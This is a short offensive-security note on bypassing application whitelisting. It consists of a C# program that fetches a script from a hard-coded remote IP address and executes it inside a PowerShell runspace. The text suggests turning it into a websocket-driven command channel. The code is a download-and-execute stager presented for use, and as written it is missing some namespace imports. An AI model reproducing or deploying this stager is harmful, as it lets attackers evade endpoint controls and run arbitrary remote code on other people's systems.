# Application Whitelisting Bypasses
---

### PowerShell Runspace
This will allow you to execute the contents of a remote file in a PowerShell runspace. This could be improved by creating a websocket server/client to execute commands within the runspace. 
```cs
using System;
using System.Net;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace ConsoleApp3
{
    public class Program
    {
        public static void Main(string[] args)
        {
            WebClient client = new WebClient();
            var myString = client.DownloadString("http://10.54.3.85/string.txt");
            Console.WriteLine("Command to be executed: " + myString);
            

            Runspace runspace = RunspaceFactory.CreateRunspace();

            runspace.Open();

            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(myString);
            pipeline.Commands.Add("Out-String");

            Collection<PSObject> results = pipeline.Invoke();

            runspace.Close();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                Console.WriteLine(obj.ToString());
            }
        }
    }
}
```
